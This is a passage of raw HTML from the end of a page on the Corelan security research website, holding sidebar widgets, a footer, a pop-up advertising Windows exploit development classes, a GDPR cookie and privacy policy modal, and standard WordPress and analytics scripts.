    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Corelan on Slack</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">			<div class="textwidget"><p>You can chat with us and our friends on our Slack workspace:</p>
<li>Go to <a href="https://www.facebook.com/corelanconsulting" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>our facebook page</a></li>
<li>Browse through the posts and find the invite to Slack</li>
<li>Use the invite to access our Slack workspace</li>
</div>
				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_meta" id="meta-2">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Actions</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body">
		<ul>
						<li><a href="https://www.corelan.be/wp-login.php" data-wpel-link="internal">Log in</a></li>
			<li><a href="https://www.corelan.be/index.php/feed/" data-wpel-link="internal">Entries feed</a></li>
			<li><a href="https://www.corelan.be/index.php/comments/feed/" data-wpel-link="internal">Comments feed</a></li>

			<li><a href="https://wordpress.org/" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>WordPress.org</a></li>
		</ul>

				<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div><div class="art-block widget widget_categories" id="categories-3">
    <div class="art-block-tl"></div>
    <div class="art-block-tr"></div>
    <div class="art-block-bl"></div>
    <div class="art-block-br"></div>
    <div class="art-block-tc"></div>
    <div class="art-block-bc"></div>
    <div class="art-block-cl"></div>
    <div class="art-block-cr"></div>
    <div class="art-block-cc"></div>
    <div class="art-block-body"><div class="art-blockheader">
    <h3 class="t">Categories</h3>
</div><div class="art-blockcontent">
    <div class="art-blockcontent-body"><form action="https://www.corelan.be" method="get"><label class="screen-reader-text" for="cat">Categories</label><select name="cat" id="cat" class="postform">
	<option value="-1">Select Category</option>
	<option class="level-0" value="6">001_Security</option>
	<option class="level-1" value="1164">&nbsp;&nbsp;&nbsp;Cons and Seminars</option>
	<option class="level-1" value="4017">&nbsp;&nbsp;&nbsp;Crypto</option>
	<option class="level-1" value="3892">&nbsp;&nbsp;&nbsp;CSO</option>
	<option class="level-1" value="1037">&nbsp;&nbsp;&nbsp;Exploit Writing Tutorials</option>
	<option class="level-1" value="803">&nbsp;&nbsp;&nbsp;Exploits</option>
	<option class="level-1" value="3464">&nbsp;&nbsp;&nbsp;Fuzzing</option>
	<option class="level-1" value="1373">&nbsp;&nbsp;&nbsp;Malware and Reversing</option>
	<option class="level-1" value="3736">&nbsp;&nbsp;&nbsp;Metasploit</option>
	<option class="level-1" value="1549">&nbsp;&nbsp;&nbsp;mona</option>
	<option class="level-1" value="1257">&nbsp;&nbsp;&nbsp;Papers</option>
	<option class="level-1" value="1492">&nbsp;&nbsp;&nbsp;Pentesting</option>
	<option class="level-1" value="3465">&nbsp;&nbsp;&nbsp;Root Cause Analysis</option>
	<option class="level-1" value="3469">&nbsp;&nbsp;&nbsp;Tools</option>
	<option class="level-1" value="1456">&nbsp;&nbsp;&nbsp;Video</option>
	<option class="level-1" value="1236">&nbsp;&nbsp;&nbsp;Web Application Security</option>
	<option class="level-2" value="3697">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SQL Injection</option>
	<option class="level-0" value="10">Active Directory</option>
	<option class="level-0" value="283">Certificates</option>
	<option class="level-0" value="241">Cisco</option>
	<option class="level-0" value="224">Development</option>
	<option class="level-0" value="124">Juniper</option>
	<option class="level-0" value="3760">Legal</option>
	<option class="level-0" value="8">Linux and Unix</option>
	<option class="level-0" value="12">MS Exchange</option>
	<option class="level-0" value="11">My Free Tools</option>
	<option class="level-0" value="5">Networking</option>
	<option class="level-0" value="13">OpsMgr</option>
	<option class="level-0" value="105">Outlook</option>
	<option class="level-0" value="3990">Penetration testing</option>
	<option class="level-0" value="34">Private</option>
	<option class="level-0" value="465">Scripts</option>
	<option class="level-1" value="466">&nbsp;&nbsp;&nbsp;Powershell</option>
	<option class="level-0" value="4">Sharepoint</option>
	<option class="level-0" value="9">Storage</option>
	<option class="level-0" value="1">Uncategorized</option>
	<option class="level-0" value="15">Virtualization</option>
	<option class="level-0" value="14">Windows Client OS</option>
	<option class="level-0" value="4059">Windows Internals</option>
	<option class="level-0" value="7">Windows Server</option>
	<option class="level-0" value="353">Wordpress</option>
</select>
</form><script type="text/javascript">
/* <![CDATA[ */

(function() {
	var dropdown = document.getElementById( "cat" );
	function onCatChange() {
		if ( dropdown.options[ dropdown.selectedIndex ].value > 0 ) {
			dropdown.parentNode.submit();
		}
	}
	dropdown.onchange = onCatChange;
})();

/* ]]> */
</script>
		<div class="cleared"></div>
    </div>
</div>		<div class="cleared"></div>
    </div>
</div>          <div class="cleared"></div>
        </div>
    </div>
</div>
<div class="cleared"></div>
    <div class="art-footer">
                <div class="art-footer-t"></div>
                <div class="art-footer-l"></div>
                <div class="art-footer-b"></div>
                <div class="art-footer-r"></div>
                <div class="art-footer-body">
                    
Mastodon: <a rel="me external noopener noreferrer" href="https://infosec.exchange/@corelanc0d3r" data-wpel-link="external" target="_blank" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>@corelanc0d3r</a> | <a rel="me external noopener noreferrer" href="https://infosec.exchange/@corelan" data-wpel-link="external" target="_blank" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>@corelan</a>

                    <a href="https://www.corelan.be/index.php/feed/" class="art-rss-tag-icon" title="Corelan Cybersecurity Research RSS Feed" data-wpel-link="internal"></a>
                  <div class="art-footer-text">
                      <br><br>Copyright Peter Van Eeckhoutte © 2007 - 2024 | All Rights Reserved | <a href="/index.php/terms-of-use/" data-wpel-link="internal">Terms of use</a><br>			<!-- Added by Peter Van Eeckhoutte -->
		      <!--  <font size=-6>Your IP address : 176.107.34.36<br> -->
			<!-- End Add -->
                  </div>
            		<div class="cleared"></div>
                </div>
            </div>
    		<div class="cleared"></div>
        </div>
    </div>
    <div class="cleared"></div>
    <p class="art-page-footer"></p>
</div>
    <div id="wp-footer">
	        

<span id="bruteprotect_uptime_check_string" style="display:none;">7ads6x98y</span>		<!-- Advertising Manager v3.5.3 (0.580 seconds.) -->
<div id="pum-12220" class="pum pum-overlay pum-theme-12209 pum-theme-enterprise-blue popmake-overlay pum-overlay-disabled auto_open click_open pum-active" data-popmake="{&quot;id&quot;:12220,&quot;slug&quot;:&quot;training-info&quot;,&quot;theme_id&quot;:12209,&quot;cookies&quot;:[{&quot;event&quot;:&quot;on_popup_close&quot;,&quot;settings&quot;:{&quot;name&quot;:&quot;pum-12220&quot;,&quot;key&quot;:&quot;&quot;,&quot;session&quot;:null,&quot;path&quot;:true,&quot;time&quot;:&quot;1 day&quot;}}],&quot;triggers&quot;:[{&quot;type&quot;:&quot;auto_open&quot;,&quot;settings&quot;:{&quot;cookie_name&quot;:[&quot;pum-12220&quot;],&quot;delay&quot;:&quot;200&quot;}},{&quot;type&quot;:&quot;click_open&quot;,&quot;settings&quot;:{&quot;extra_selectors&quot;:&quot;&quot;,&quot;cookie_name&quot;:null}}],&quot;mobile_disabled&quot;:true,&quot;tablet_disabled&quot;:null,&quot;meta&quot;:{&quot;display&quot;:{&quot;stackable&quot;:false,&quot;overlay_disabled&quot;:&quot;1&quot;,&quot;scrollable_content&quot;:false,&quot;disable_reposition&quot;:false,&quot;size&quot;:&quot;medium&quot;,&quot;responsive_min_width&quot;:&quot;0%&quot;,&quot;responsive_min_width_unit&quot;:false,&quot;responsive_max_width&quot;:&quot;70%&quot;,&quot;responsive_max_width_unit&quot;:false,&quot;custom_width&quot;:&quot;640px&quot;,&quot;custom_width_unit&quot;:false,&quot;custom_height&quot;:&quot;380px&quot;,&quot;custom_height_unit&quot;:false,&quot;custom_height_auto&quot;:false,&quot;location&quot;:&quot;center&quot;,&quot;position_from_trigger&quot;:false,&quot;position_top&quot;:&quot;100&quot;,&quot;position_left&quot;:&quot;0&quot;,&quot;position_bottom&quot;:&quot;0&quot;,&quot;position_right&quot;:&quot;0&quot;,&quot;position_fixed&quot;:false,&quot;animation_type&quot;:&quot;fade&quot;,&quot;animation_speed&quot;:&quot;350&quot;,&quot;animation_origin&quot;:&quot;center top&quot;,&quot;overlay_zindex&quot;:false,&quot;zindex&quot;:&quot;1999999999&quot;},&quot;close&quot;:{&quot;text&quot;:&quot;X&quot;,&quot;button_delay&quot;:&quot;0&quot;,&quot;overlay_click&quot;:false,&quot;esc_press&quot;:false,&quot;f4_press&quot;:false},&quot;click_open&quot;:[]}}" role="dialog" aria-modal="false" style="opacity: 1; display: block;">

	<div id="popmake-12220" class="pum-container popmake theme-12209 pum-responsive pum-responsive-medium responsive size-medium active custom-position" style="min-width: 0%; max-width: 70%; top: 10px; left: 640px; opacity: 0; display: block;">

				

				

		

				<div class="pum-content popmake-content" tabindex="0">
			<h3 style="text-align: center;">Hi there!</h3>
<p>&nbsp;</p>
<p style="text-align: center;">Do you like our free content? Enjoying the materials we put together?</p>
<p style="text-align: center;">Are you interested in learning how to write exploits for Windows, but perhaps looking for updated materials?</p>
<p style="text-align: center;">Are you struggling to fully grasp the concepts based on what you find online? Would you perhaps prefer to learn in a classroom setting instead?</p>
<p>&nbsp;</p>
<h3 style="text-align: center;"><span style="color: #ffffff;"><em><strong>We have good news for you!</strong></em></span></h3>
<p>&nbsp;</p>
<p style="text-align: center;">Did you know that we travel to strategic places around the world, to teach our world-renowned exploit development classes.</p>
<p style="text-align: center;">In order to preserve and ensure a top-quality learning experience, all of our classes are delivered in-person.</p>
<p style="text-align: center;">I also teach private classes! For larger groups, I’ll glady come to you. For smaller groups, willing to travel to Belgium,&nbsp; I’ll provide a training room near Bruges.</p>
<p>&nbsp;</p>
<p style="text-align: center;">We currently offer 2 classes:</p>
<p style="text-align: center;">Our “<a href="https://www.corelan-training.com/index.php/training/bootcamp" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Bootcamp</a>” classes covers the basics of exploit development for Windows 11.</p>
<p style="text-align: center;">The “<a href="https://www.corelan-training.com/index.php/training/advanced" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>Advanced</a>” class covers heap exploitation for Windows 7, Windows 10 and Windows 11.</p>
<p style="text-align: center;">Both classes contain a short introduction on x64 exploitation!</p>
<p>&nbsp;</p>
<p style="text-align: center;">You can find our schedules here: <a href="https://www.corelan-training.com/index.php/training-schedules" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>https://www.corelan-training.com/index.php/training-schedules</a> .</p>
<p>&nbsp;</p>
<blockquote>
<p style="text-align: center;"><span style="color: #ffffff;"><em><strong>&gt;&gt;&gt; Our classes tend to sell out fast, so sign up today and secure your seat in one of our classes !! &lt;&lt;&lt;</strong></em></span></p>
</blockquote>
<p>&nbsp;</p>
<p style="text-align: center;">And if you’re not sure – <a href="https://www.corelan-training.com/index.php/testimonials/" data-wpel-link="external" target="_blank" rel="external noopener noreferrer" class="wpel-icon-left"><i class="wpel-icon dashicons-before dashicons-admin-site" aria-hidden="true"></i>feel free to check what our students have to say about our classes</a>.</p>
<p>&nbsp;</p>
<p style="text-align: center;">Enjoy!</p>
<p style="text-align: center;">
		</p></div>


				

							<button type="button" class="pum-close popmake-close" aria-label="Close">
			X			</button>
		
	</div>

</div>

  <!--copyscapeskip-->
  <aside id="moove_gdpr_cookie_info_bar" class="moove-gdpr-info-bar-hidden moove-gdpr-align-center moove-gdpr-dark-scheme gdpr_infobar_postion_bottom" aria-label="GDPR Cookie Banner" style="display: none;">
    <div class="moove-gdpr-info-bar-container">
      <div class="moove-gdpr-info-bar-content">
        
<div class="moove-gdpr-cookie-notice">
  <p>We are using cookies to give you the best experience on our website.</p>
<p>You can find out more about which cookies we are using or switch them off in <button data-href="#moove_gdpr_cookie_modal" class="change-settings-button">settings</button>.</p>
</div>
<!--  .moove-gdpr-cookie-notice -->        
<div class="moove-gdpr-button-holder">
		  <button class="mgbutton moove-gdpr-infobar-allow-all gdpr-fbo-0" aria-label="Accept">Accept</button>
	  </div>
<!--  .button-container -->      </div>
      <!-- moove-gdpr-info-bar-content -->
    </div>
    <!-- moove-gdpr-info-bar-container -->
  </aside>
  <!-- #moove_gdpr_cookie_info_bar -->
  <!--/copyscapeskip-->
<link rel="stylesheet" id="yarppRelatedCss-css" href="https://www.corelan.be/wp-content/plugins/yet-another-related-posts-plugin/style/related.css?ver=5.30.10" type="text/css" media="all">
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-includes/js/comment-reply.min.js?ver=81f1e4891736f11093e8f14f84539862" id="comment-reply-js" async="async" data-wp-strategy="async"></script>
<script type="text/javascript" id="wp-postviews-cache-js-extra">
/* <![CDATA[ */
var viewsCacheL10n = {"admin_ajax_url":"https:\/\/www.corelan.be\/wp-admin\/admin-ajax.php","nonce":"0b801e2690","post_id":"2114"};
/* ]]> */
</script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-content/plugins/wp-postviews/postviews-cache.js?ver=1.68" id="wp-postviews-cache-js"></script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-content/plugins/auto-thickbox/js/auto-thickbox.min.js?ver=20150514" id="thickbox-js"></script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-content/plugins/page-links-to/dist/new-tab.js?ver=3.3.7" id="page-links-to-js"></script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-includes/js/jquery/ui/core.min.js?ver=1.13.2" id="jquery-ui-core-js"></script>
<script type="text/javascript" id="popup-maker-site-js-extra">
/* <![CDATA[ */
var pum_vars = {"version":"1.19.0","pm_dir_url":"https:\/\/www.corelan.be\/wp-content\/plugins\/popup-maker\/","ajaxurl":"https:\/\/www.corelan.be\/wp-admin\/admin-ajax.php","restapi":"https:\/\/www.corelan.be\/index.php\/wp-json\/pum\/v1","rest_nonce":null,"default_theme":"12207","debug_mode":"","disable_tracking":"","home_url":"\/","message_position":"top","core_sub_forms_enabled":"1","popups":[],"cookie_domain":"","analytics_route":"bb41a7b3b156d95653c79ae77e7cc8b5","analytics_api":"https:\/\/www.corelan.be\/index.php\/wp-json\/860c56f7cac49da01f9d073abd7e484e\/v1"};
var pum_sub_vars = {"ajaxurl":"https:\/\/www.corelan.be\/wp-admin\/admin-ajax.php","message_position":"top"};
var pum_popups = {"pum-12220":{"triggers":[{"type":"auto_open","settings":{"cookie_name":["pum-12220"],"delay":"200"}}],"cookies":[{"event":"on_popup_close","settings":{"name":"pum-12220","key":"","session":null,"path":true,"time":"1 day"}}],"disable_on_mobile":true,"disable_on_tablet":false,"atc_promotion":null,"explain":null,"type_section":null,"theme_id":"12209","size":"medium","responsive_min_width":"0%","responsive_max_width":"70%","custom_width":"640px","custom_height_auto":false,"custom_height":"380px","scrollable_content":false,"animation_type":"fade","animation_speed":"350","animation_origin":"center top","open_sound":"none","custom_sound":"","location":"center","position_top":"100","position_bottom":"0","position_left":"0","position_right":"0","position_from_trigger":false,"position_fixed":false,"overlay_disabled":true,"stackable":false,"disable_reposition":false,"zindex":"1999999999","close_button_delay":"0","fi_promotion":null,"close_on_form_submission":false,"close_on_form_submission_delay":"0","close_on_overlay_click":false,"close_on_esc_press":false,"close_on_f4_press":false,"disable_form_reopen":true,"disable_accessibility":false,"theme_slug":"enterprise-blue","id":12220,"slug":"training-info"}};
/* ]]> */
</script>
<script defer="" type="text/javascript" src="//www.corelan.be/wp-content/uploads/eb7dd09ba487003efa16cb4e2c57aef5.js?defer&amp;generated=1716470310&amp;ver=1.19.0" id="popup-maker-site-js"></script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-content/plugins/popup-maker/assets/js/vendor/mobile-detect.min.js?ver=1.3.3" id="mobile-detect-js"></script>
<script defer="" type="text/javascript" src="https://stats.wp.com/e-202424.js" id="jetpack-stats-js" data-wp-strategy="defer"></script>
<script defer="" type="text/javascript" id="jetpack-stats-js-after">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"15427359\",\"post\":\"2114\",\"tz\":\"2\",\"srv\":\"www.corelan.be\",\"j\":\"1:13.5\"}") ]);
_stq.push([ "clickTrackerInit", "15427359", "2114" ]);
/* ]]> */
</script>
<script type="text/javascript" id="moove_gdpr_frontend-js-extra">
/* <![CDATA[ */
var moove_frontend_gdpr_scripts = {"ajaxurl":"https:\/\/www.corelan.be\/wp-admin\/admin-ajax.php","post_id":"2114","plugin_dir":"https:\/\/www.corelan.be\/wp-content\/plugins\/gdpr-cookie-compliance","show_icons":"all","is_page":"","ajax_cookie_removal":"false","strict_init":"1","enabled_default":{"third_party":0,"advanced":0},"geo_location":"false","force_reload":"false","is_single":"1","hide_save_btn":"false","current_user":"0","cookie_expiration":"365","script_delay":"2000","close_btn_action":"1","close_btn_rdr":"","scripts_defined":"{\"cache\":true,\"header\":\"\",\"body\":\"\",\"footer\":\"\",\"thirdparty\":{\"header\":\"\",\"body\":\"\",\"footer\":\"\"},\"advanced\":{\"header\":\"\",\"body\":\"\",\"footer\":\"\"}}","gdpr_scor":"true","wp_lang":"","wp_consent_api":"false"};
/* ]]> */
</script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-content/plugins/gdpr-cookie-compliance/dist/scripts/main.js?ver=4.15.1" id="moove_gdpr_frontend-js"></script>
<script defer="" type="text/javascript" id="moove_gdpr_frontend-js-after">
/* <![CDATA[ */
var gdpr_consent__strict = "false"
var gdpr_consent__thirdparty = "false"
var gdpr_consent__advanced = "false"
var gdpr_consent__cookies = ""
/* ]]> */
</script>
<script type="text/javascript" id="stbClient-js-extra">
/* <![CDATA[ */
var stbUserOptions = {"restData":{"root":"https:\/\/www.corelan.be\/index.php\/wp-json\/","nonce":"d6c2727ce3"}};
/* ]]> */
</script>
<script defer="" type="text/javascript" src="https://www.corelan.be/wp-content/plugins/wp-special-textboxes/js/client.js?ver=6.2.2" id="stbClient-js"></script>

  <!--copyscapeskip-->
  <button data-href="#moove_gdpr_cookie_modal" id="moove_gdpr_save_popup_settings_button" style="display: none;" class="" aria-label="Change cookie settings">
    <span class="moove_gdpr_icon">
      <svg viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" style="max-width: 30px; max-height: 30px;">
        <g data-name="1">
          <path d="M293.9,450H233.53a15,15,0,0,1-14.92-13.42l-4.47-42.09a152.77,152.77,0,0,1-18.25-7.56L163,413.53a15,15,0,0,1-20-1.06l-42.69-42.69a15,15,0,0,1-1.06-20l26.61-32.93a152.15,152.15,0,0,1-7.57-18.25L76.13,294.1a15,15,0,0,1-13.42-14.91V218.81A15,15,0,0,1,76.13,203.9l42.09-4.47a152.15,152.15,0,0,1,7.57-18.25L99.18,148.25a15,15,0,0,1,1.06-20l42.69-42.69a15,15,0,0,1,20-1.06l32.93,26.6a152.77,152.77,0,0,1,18.25-7.56l4.47-42.09A15,15,0,0,1,233.53,48H293.9a15,15,0,0,1,14.92,13.42l4.46,42.09a152.91,152.91,0,0,1,18.26,7.56l32.92-26.6a15,15,0,0,1,20,1.06l42.69,42.69a15,15,0,0,1,1.06,20l-26.61,32.93a153.8,153.8,0,0,1,7.57,18.25l42.09,4.47a15,15,0,0,1,13.41,14.91v60.38A15,15,0,0,1,451.3,294.1l-42.09,4.47a153.8,153.8,0,0,1-7.57,18.25l26.61,32.93a15,15,0,0,1-1.06,20L384.5,412.47a15,15,0,0,1-20,1.06l-32.92-26.6a152.91,152.91,0,0,1-18.26,7.56l-4.46,42.09A15,15,0,0,1,293.9,450ZM247,420h33.39l4.09-38.56a15,15,0,0,1,11.06-12.91A123,123,0,0,0,325.7,356a15,15,0,0,1,17,1.31l30.16,24.37,23.61-23.61L372.06,328a15,15,0,0,1-1.31-17,122.63,122.63,0,0,0,12.49-30.14,15,15,0,0,1,12.92-11.06l38.55-4.1V232.31l-38.55-4.1a15,15,0,0,1-12.92-11.06A122.63,122.63,0,0,0,370.75,187a15,15,0,0,1,1.31-17l24.37-30.16-23.61-23.61-30.16,24.37a15,15,0,0,1-17,1.31,123,123,0,0,0-30.14-12.49,15,15,0,0,1-11.06-12.91L280.41,78H247l-4.09,38.56a15,15,0,0,1-11.07,12.91A122.79,122.79,0,0,0,201.73,142a15,15,0,0,1-17-1.31L154.6,116.28,131,139.89l24.38,30.16a15,15,0,0,1,1.3,17,123.41,123.41,0,0,0-12.49,30.14,15,15,0,0,1-12.91,11.06l-38.56,4.1v33.38l38.56,4.1a15,15,0,0,1,12.91,11.06A123.41,123.41,0,0,0,156.67,311a15,15,0,0,1-1.3,17L131,358.11l23.61,23.61,30.17-24.37a15,15,0,0,1,17-1.31,122.79,122.79,0,0,0,30.13,12.49,15,15,0,0,1,11.07,12.91ZM449.71,279.19h0Z" fill="currentColor"></path>
          <path d="M263.71,340.36A91.36,91.36,0,1,1,355.08,249,91.46,91.46,0,0,1,263.71,340.36Zm0-152.72A61.36,61.36,0,1,0,325.08,249,61.43,61.43,0,0,0,263.71,187.64Z" fill="currentColor"></path>
        </g>
      </svg>
    </span>

    <span class="moove_gdpr_text">Change cookie settings</span>
  </button>
  <!--/copyscapeskip-->
    
  <!--copyscapeskip-->
  <!-- V1 -->
  <div id="moove_gdpr_cookie_modal" class="gdpr_lightbox-hide" role="complementary" aria-label="GDPR Settings Screen">
    <div class="moove-gdpr-modal-content moove-clearfix logo-position-left moove_gdpr_modal_theme_v1">
          
        <button class="moove-gdpr-modal-close" aria-label="Close GDPR Cookie Settings">
          <span class="gdpr-sr-only">Close GDPR Cookie Settings</span>
          <span class="gdpr-icon moovegdpr-arrow-close"></span>
        </button>
            <div class="moove-gdpr-modal-left-content">
        
<div class="moove-gdpr-company-logo-holder">
  <img src="https://www.corelan.be/wp-content/uploads/2018/06/corelan-gcv-small-300x294.jpg" alt="" width="300" height="294" class="img-responsive">
</div>
<!--  .moove-gdpr-company-logo-holder -->        <ul id="moove-gdpr-menu">
          
<li class="menu-item-on menu-item-privacy_overview menu-item-selected">
  <button data-href="#privacy_overview" class="moove-gdpr-tab-nav" aria-label="Privacy Overview">
    <span class="gdpr-nav-tab-title">Privacy Overview</span>
  </button>
</li>

  <li class="menu-item-strict-necessary-cookies menu-item-off">
    <button data-href="#strict-necessary-cookies" class="moove-gdpr-tab-nav" aria-label="Strictly Necessary Cookies">
      <span class="gdpr-nav-tab-title">Strictly Necessary Cookies</span>
    </button>
  </li>




  <li class="menu-item-moreinfo menu-item-off">
    <button data-href="#cookie_policy_modal" class="moove-gdpr-tab-nav" aria-label="Cookie Policy">
      <span class="gdpr-nav-tab-title">Cookie Policy</span>
    </button>
  </li>
        </ul>
        
<div class="moove-gdpr-branding-cnt">
  </div>
<!--  .moove-gdpr-branding -->      </div>
      <!--  .moove-gdpr-modal-left-content -->
      <div class="moove-gdpr-modal-right-content">
        <div class="moove-gdpr-modal-title">
           
        </div>
        <!-- .moove-gdpr-modal-ritle -->
        <div class="main-modal-content">

          <div class="moove-gdpr-tab-content">
            
<div id="privacy_overview" class="moove-gdpr-tab-main">
      <span class="tab-title">Privacy Overview</span>
    <div class="moove-gdpr-tab-main-content">
  	<p>a. Corelan respects your privacy. Most information accessible on or via the<br>
Corelan Website is available without the need to provide personal information.<br>
In certain cases you may however be requested to submit personal information. In<br>
such case your personal information shall be treated in accordance with the General Data Protection Regulation and any amendments hereof.</p>
<p>b. All personal information made available by you will be treated solely for<br>
the purpose of making available to you the requested information or services.<br>
Your personal information will not be shared with third parties, but it may be used for authentication, support &amp; marketing purposes in relation with services provided by Corelan.</p>
<p>c. We will only keep your personal information for as long as is required to<br>
provide you with the requested information or services, or for any longer period<br>
as may legally be required.</p>
<p>d. It is our goal to reasonably protect the personal information made<br>
available by you from third parties.</p>
<p>e. You have the right to consult, correct, adjust or have removed your<br>
personal details by written request to Corelan. &nbsp;If you decide to get your information removed, you understand and accept that you will lose all access to any resources that require the use of these personal details, such as parts of the website that require authentication.</p>
<p>f. When using the Corelan Website, cookies may possible be used. You do not have to accept cookies to be able to use the publicly accessible parts of Corelan Websites.&nbsp;If you have an account and you log in to this site, we will set a temporary cookie to determine if your browser accepts cookies. This cookie contains no personal data and is discarded when you close your browser.</p>
<p>When you log in, we will also set up several cookies to save your login information and your screen display choices.&nbsp; &nbsp;Cookies may be used to display advertisements or to collect statistics about the use of the Corelan website.</p>
<p>g. This privacy policy may be amended by Corelan at any time.</p>
  	  </div>
  <!--  .moove-gdpr-tab-main-content -->

</div>
<!-- #privacy_overview -->            
  <div id="strict-necessary-cookies" class="moove-gdpr-tab-main" style="display:none">
    <span class="tab-title">Strictly Necessary Cookies</span>
    <div class="moove-gdpr-tab-main-content">
      <p>Strictly Necessary Cookie should be enabled at all times so that we can save your preferences for cookie settings.</p>
      <div class="moove-gdpr-status-bar ">
        <div class="gdpr-cc-form-wrap">
          <div class="gdpr-cc-form-fieldset">
            <label class="cookie-switch" for="moove_gdpr_strict_cookies">    
              <span class="gdpr-sr-only">Enable or Disable Cookies</span>        
              <input type="checkbox" aria-label="Strictly Necessary Cookies" value="check" name="moove_gdpr_strict_cookies" id="moove_gdpr_strict_cookies">
              <span class="cookie-slider cookie-round" data-text-enable="Enabled" data-text-disabled="Disabled"></span>
            </label>
          </div>
          <!-- .gdpr-cc-form-fieldset -->
        </div>
        <!-- .gdpr-cc-form-wrap -->
      </div>
      <!-- .moove-gdpr-status-bar -->
              <div class="moove-gdpr-strict-warning-message" style="margin-top: 10px;">
          <p>If you disable this cookie, we will not be able to save your preferences. This means that every time you visit this website you will need to enable or disable cookies again.</p>
        </div>
        <!--  .moove-gdpr-tab-main-content -->
                                              
    </div>
    <!--  .moove-gdpr-tab-main-content -->
  </div>
  <!-- #strict-necesarry-cookies -->
            
            
            
  <div id="cookie_policy_modal" class="moove-gdpr-tab-main" style="display:none">
    <span class="tab-title">Cookie Policy</span>
    <div class="moove-gdpr-tab-main-content">
      <p>When using the Corelan Website, cookies may possibly be used. You do not have to accept cookies to be able to use the publicly accessible parts of the Corelan Website.&nbsp;If you have an account and you log in to this site, we will set a temporary cookie to determine if your browser accepts cookies. This cookie contains no personal data and is discarded when you close your browser. When you log in, we will also set up several cookies to save your login information and your screen display choices.</p>
<p>We may use third party cookies to show ads and to collect anonymous information such as the number of visitors to the site, and the most popular pages.&nbsp; The ability to show ads is an important source of income to cover the hosting fees to keep this website alive. If you prevent ads from being displayed, this website will eventually disappear.<br>
Third party vendors, including Google, use cookies to serve ads based on a user's prior visits to this website or other websites.<br>
Google's use of advertising cookies enables it and its partners to serve ads to your users based on their visit to this site and/or other sites on the Internet.</p>
       
    </div>
    <!--  .moove-gdpr-tab-main-content -->
  </div>
          </div>
          <!--  .moove-gdpr-tab-content -->
        </div>
        <!--  .main-modal-content -->
        <div class="moove-gdpr-modal-footer-content">
          <div class="moove-gdpr-button-holder">
			  		<button class="mgbutton moove-gdpr-modal-allow-all button-visible" aria-label="Enable All">Enable All</button>
		  					<button class="mgbutton moove-gdpr-modal-save-settings button-visible" aria-label="Save Changes">Save Changes</button>
				</div>
<!--  .moove-gdpr-button-holder -->        </div>
        <!--  .moove-gdpr-modal-footer-content -->
      </div>
      <!--  .moove-gdpr-modal-right-content -->

      <div class="moove-clearfix"></div>

    </div>
    <!--  .moove-gdpr-modal-content -->
  </div>
  <!-- #moove_gdpr_cookie_modal -->
  <!--/copyscapeskip-->
	        <!-- 196 queries. 0.590 seconds. -->
    </div>



<ins class="adsbygoogle adsbygoogle-noablate" style="display: none !important;" data-adsbygoogle-status="done"><div id="aswift_0_host" style="border: medium; height: 0px; width: 0px; margin: 0px; padding: 0px; position: relative; visibility: visible; background-color: transparent; display: inline-block;"><iframe id="aswift_0" name="aswift_0" style="left:0;position:absolute;top:0;border:0;width:undefinedpx;height:undefinedpx;" sandbox="allow-forms allow-popups allow-popups-to-escape-sandbox allow-same-origin allow-scripts allow-top-navigation-by-user-activation" frameborder="0" marginwidth="0" marginheight="0" vspace="0" hspace="0" allowtransparency="true" scrolling="no" 